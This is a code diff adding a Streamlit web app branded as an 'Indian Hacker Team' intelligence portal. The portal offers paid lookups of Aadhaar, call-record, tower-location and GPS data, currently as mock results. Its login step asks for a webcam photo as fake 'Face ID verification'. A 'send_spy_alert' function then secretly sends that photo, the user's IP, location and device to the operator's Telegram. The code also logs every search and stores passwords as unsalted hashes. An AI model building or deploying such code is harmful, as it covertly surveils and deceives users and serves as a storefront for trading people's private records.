@@ -1,0 +1,317 @@
+
+import streamlit as st
+import pandas as pd
+import hashlib
+import secrets
+import requests
+import pyotp
+import qrcode
+import certifi
+from datetime import datetime
+from pymongo import MongoClient
+from streamlit.web.server.websocket_headers import _get_websocket_headers
+
+# ==========================================
+# 🔐 MASTER CONFIGURATION
+# ==========================================
+# ⚠️ REPLACE WITH YOUR REAL DETAILS
+MONGO_URI = "YOUR_MONGODB_CONNECTION_STRING"
+BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
+ADMIN_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"  # To receive Spy Photos/Logs
+MASTER_ADMIN_PASSWORD = "HACKER_GOD_MODE" # Required to unlock Admin Panel
+
+# ==========================================
+# 🔌 DATABASE & FORENSICS ENGINE
+# ==========================================
+@st.cache_resource
+def init_connection():
+    return MongoClient(MONGO_URI, tlsCAFile=certifi.where())
+
+client = init_connection()
+db = client.verification_db
+users_collection = db.users
+logs_collection = db.activity_logs
+
+def get_ip_info():
+    """Fetches User's Real Public IP & Location."""
+    try:
+        response = requests.get('https://ipapi.co/json/', timeout=3)
+        data = response.json()
+        return f"{data.get('ip')} ({data.get('city')}, {data.get('country_name')})"
+    except:
+        return "Hidden/Proxy"
+
+def get_device_info():
+    """Extracts Browser & OS Information."""
+    headers = _get_websocket_headers()
+    return headers.get("User-Agent", "Unknown Device") if headers else "Unknown"
+
+def send_spy_alert(message, photo_buffer=None):
+    """Sends forensic data (IP, Device, Photo) to your Telegram."""
+    try:
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                      data={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown"})
+        if photo_buffer:
+            files = {"photo": ("capture.jpg", photo_buffer, "image/jpeg")}
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
+                          data={"chat_id": ADMIN_CHAT_ID}, files=files)
+    except:
+        pass
+
+def log_activity(email, action, data):
+    """Saves every single click to the Database."""
+    logs_collection.insert_one({
+        "timestamp": datetime.now(),
+        "user_email": email,
+        "action": action,
+        "input_data": data,
+        "ip_address": get_ip_info(),
+        "role": st.session_state.get('user_role', 'unknown')
+    })
+
+# ==========================================
+# 👤 AUTHENTICATION LOGIC
+# ==========================================
+def make_hash(password):
+    return hashlib.sha256(str.encode(password)).hexdigest()
+
+def login_user(email, password):
+    user = users_collection.find_one({"email": email})
+    if user and user['password'] == make_hash(password):
+        return user
+    return None
+
+def register_user(email, password, role="citizen"):
+    if users_collection.find_one({"email": email}): return False
+    users_collection.insert_one({
+        "email": email, 
+        "password": make_hash(password), 
+        "role": role, # citizen, police, government_official, administrative
+        "is_subscriber": False, 
+        "totp_secret": pyotp.random_base32(), 
+        "api_key": None
+    })
+    return True
+
+def admin_reset_password(email, new_pass):
+    hashed = make_hash(new_pass)
+    return users_collection.update_one({"email": email}, {"$set": {"password": hashed}}).modified_count > 0
+
+# ==========================================
+# 🖥️ GUI INTERFACE (HACKER THEME)
+# ==========================================
+def main():
+    st.set_page_config(page_title="I.H.T Intelligence", layout="wide", page_icon="☠️")
+
+    # --- 🎨 CUSTOM CSS FOR HACKER LOOK ---
+    st.markdown("""
+        <style>
+        .hacker-title {
+            text-align: center;
+            font-family: 'Courier New', Courier, monospace;
+            color: #39ff14; /* Neon Green */
+            text-shadow: 0px 0px 10px #39ff14;
+            font-size: 3em;
+            font-weight: bold;
+        }
+        .hacker-subtitle {
+            text-align: center;
+            color: white;
+            font-family: sans-serif;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+        }
+        .stButton>button {
+            color: #39ff14;
+            border: 1px solid #39ff14;
+            background-color: black;
+        }
+        </style>
+        <div class='hacker-title'>☠️ INDIAN HACKER TEAM ☠️</div>
+        <div class='hacker-subtitle'>GOVERNMENT INTELLIGENCE & SURVEILLANCE SYSTEM</div>
+        <hr style="border-top: 1px solid #39ff14;">
+    """, unsafe_allow_html=True)
+
+    if 'logged_in' not in st.session_state: st.session_state['logged_in'] = False
+
+    # --- SIDEBAR NAVIGATION ---
+    menu = ["Login", "Sign Up"]
+    if st.session_state['logged_in']:
+        role = st.session_state.get('user_role', 'citizen')
+        if role == 'administrative':
+            menu = ["Admin Dashboard", "User Dashboard", "Logout"]
+        else:
+            menu = ["User Dashboard", "Logout"]
+    
+    choice = st.sidebar.selectbox("ACCESS TERMINAL", menu)
+
+    # --- 1. LOGIN (WITH SPYWARE) ---
+    if choice == "Login":
+        c1, c2 = st.columns(2)
+        email = c1.text_input("CODENAME / EMAIL")
+        password = c2.text_input("ACCESS KEY", type='password')
+        
+        st.warning("⚠️ BIOMETRIC SCAN REQUIRED FOR ACCESS")
+        photo = st.camera_input("FACE ID VERIFICATION")
+
+        if st.button("INITIATE SESSION"):
+            if not photo:
+                st.error("❌ FACE ID MISSING. ACCESS DENIED.")
+                return
+
+            user = login_user(email, password)
+            if user:
+                # 🕵️ SEND SPY ALERT TO TELEGRAM
+                msg = f"🚨 **INTRUSION DETECTED**\n👤: `{email}`\n🌍: `{get_ip_info()}`\n📱: `{get_device_info()}`\n🎭 Role: `{user['role']}`"
+                with st.spinner("VERIFYING BIOMETRICS..."):
+                    send_spy_alert(msg, photo)
+
+                st.session_state.update({'logged_in': True, 'user_email': email, 'user_role': user['role']})
+                st.success(f"ACCESS GRANTED. WELCOME, {user['role'].upper()}.")
+                st.rerun()
+            else:
+                st.error("ACCESS DENIED.")
+
+    # --- 2. SIGN UP ---
+    elif choice == "Sign Up":
+        st.write("📝 **New Recruit Registration**")
+        new_email = st.text_input("Email")
+        new_pass = st.text_input("Password", type='password')
+        
+        # User requests a role, Admin can change it later
+        req_role = st.selectbox("Requested Clearance", ["citizen", "police", "government_official"])
+        
+        if st.button("Request Access"):
+            if register_user(new_email, new_pass, req_role): 
+                st.success("Recruit Registered. Please Login.")
+            else: 
+                st.error("User already exists.")
+
+    # --- 3. USER DASHBOARD (ROLE-BASED) ---
+    elif choice == "User Dashboard":
+        user_data = users_collection.find_one({"email": st.session_state['user_email']})
+        role = user_data.get('role', 'citizen')
+        is_sub = user_data.get('is_subscriber', False)
+
+        # 🎭 DISPLAY ROLE BADGE
+        if role == 'police': st.error("👮 POLICE DEPARTMENT ACCESS ENABLED")
+        elif role == 'government_official': st.warning("🏛️ GOVERNMENT OFFICIAL ACCESS")
+        elif role == 'administrative': st.success("⚙️ SYSTEM ADMINISTRATOR")
+        else: st.info("👤 NORMAL CITIZEN ACCESS")
+
+        t1, t2 = st.tabs(["🛠️ Intelligence Tools", "🔐 Security & Keys"])
+
+        with t1:
+            # DEFINE TOOLS FOR EACH ROLE
+            tools_citizen = ["Truecaller Search", "PAN Check", "Vehicle RC", "UPI Finder"]
+            tools_police = tools_citizen + ["CDR (Call Logs)", "Tower Location", "FIR History", "Live GPS Tracker"]
+            tools_govt = tools_citizen + ["Full Aadhar Info", "Bank Link Status", "LPG Full Profile", "Land Records"]
+            
+            # Filter Available Tools
+            if role == 'administrative': available = list(set(tools_police + tools_govt))
+            elif role == 'police': available = tools_police
+            elif role == 'government_official': available = tools_govt
+            else: available = tools_citizen
+
+            tool = st.selectbox("SELECT INTELLIGENCE MODULE", available)
+            query = st.text_input(f"ENTER TARGET ID FOR {tool.upper()}")
+            
+            if st.button("EXECUTE SEARCH"):
+                # Check Subscription (Admins bypass payment)
+                if not is_sub and role != 'administrative':
+                    st.error("💳 SUBSCRIPTION REQUIRED FOR API ACCESS.")
+                else:
+                    # Log the search for forensics
+                    log_activity(st.session_state['user_email'], f"Used: {tool}", query)
+                    
+                    st.markdown(f"`> CONNECTING TO {tool.upper()} SERVER...`")
+                    import time; time.sleep(1.5)
+                    st.success("DATA RETRIEVED")
+                    
+                    # --- MOCK DATA FOR DEMO ---
+                    if tool == "CDR (Call Logs)":
+                        st.dataframe(pd.DataFrame({
+                            "Time": ["10:00", "11:05", "14:20"], 
+                            "Number": ["9988776655", "8877665544", "7766554433"], 
+                            "Tower": ["DL-01", "MUM-02", "KOL-05"],
+                            "Duration": ["120s", "45s", "300s"]
+                        }))
+                    elif tool == "Full Aadhar Info":
+                        st.json({"UID": "9988-7766-5544", "Name": "TARGET SUBJECT", "Address": "H.No 123, VVIP Lane, Mumbai"})
+                    else:
+                        st.json({"Status": "Active", "Target": query, "Result": "VERIFIED (Mock Data)"})
+
+        with t2:
+            st.subheader("🔐 2FA & API Key")
+            secret = user_data.get('totp_secret')
+            
+            # Generate QR Code for Google Authenticator
+            uri = pyotp.totp.TOTP(secret).provisioning_uri(name=st.session_state['user_email'], issuer_name="IHT_Portal")
+            c1, c2 = st.columns(2)
+            c1.image(qrcode.make(uri).get_image(), width=200, caption="Scan in Auth App")
+            c2.code(secret)
+            st.info("Use the 6-digit code from your App to login to the Telegram Bot.")
+            
+            st.markdown("---")
+            if st.button("Generate API Key"):
+                new_key = f"sk_{secrets.token_hex(16)}"
+                users_collection.update_one({"email": st.session_state['user_email']}, {"$set": {"api_key": new_key}})
+                st.rerun()
+            st.code(user_data.get('api_key', "NO KEY GENERATED"))
+
+    # --- 4. ADMIN DASHBOARD (SECURED) ---
+    elif choice == "Admin Dashboard":
+        # 🔒 MASTER PASSWORD LOCK
+        if 'admin_unlocked' not in st.session_state: st.session_state['admin_unlocked'] = False
+        
+        if not st.session_state['admin_unlocked']:
+            st.warning("🔒 RESTRICTED AREA. AUTHORIZATION REQUIRED.")
+            if st.text_input("ENTER MASTER PASSWORD", type="password") == MASTER_ADMIN_PASSWORD:
+                st.session_state['admin_unlocked'] = True
+                st.rerun()
+            return
+
+        st.title("⚙️ GOD MODE (ADMIN)")
+        t1, t2, t3 = st.tabs(["🕵️ Forensic Logs", "👥 User Database", "🛠️ Management"])
+        
+        with t1:
+            st.subheader("User Activity Feed")
+            logs = list(logs_collection.find({}, {"_id": 0}).sort("timestamp", -1))
+            df = pd.DataFrame(logs)
+            st.dataframe(df)
+            st.download_button("Download Evidence (CSV)", df.to_csv(index=False).encode('utf-8'), "logs.csv")
+
+        with t2:
+            st.subheader("Registered Users")
+            st.dataframe(pd.DataFrame(list(users_collection.find({}, {"_id": 0, "password": 0}))))
+
+        with t3:
+            st.subheader("Manage User Privileges")
+            target = st.text_input("Target Email")
+            
+            c1, c2, c3 = st.columns(3)
+            with c1:
+                new_role = st.selectbox("Assign Role", ["citizen", "police", "government_official", "administrative"])
+                if st.button("Update Role"):
+                    users_collection.update_one({"email": target}, {"$set": {"role": new_role}})
+                    st.success("Role Updated.")
+            
+            with c2:
+                new_pw = st.text_input("New Password")
+                if st.button("Reset Password"):
+                    if new_pw and admin_reset_password(target, new_pw): st.success("Password Reset.")
+            
+            with c3:
+                st.write("Subscription")
+                if st.button("Toggle Status"):
+                    u = users_collection.find_one({"email": target})
+                    if u: 
+                        users_collection.update_one({"email": target}, {"$set": {"is_subscriber": not u.get('is_subscriber')}})
+                        st.success("Subscription Toggled.")
+
+    elif choice == "Logout":
+        st.session_state.clear()
+        st.rerun()
+
+if __name__ == '__main__':
+    main()
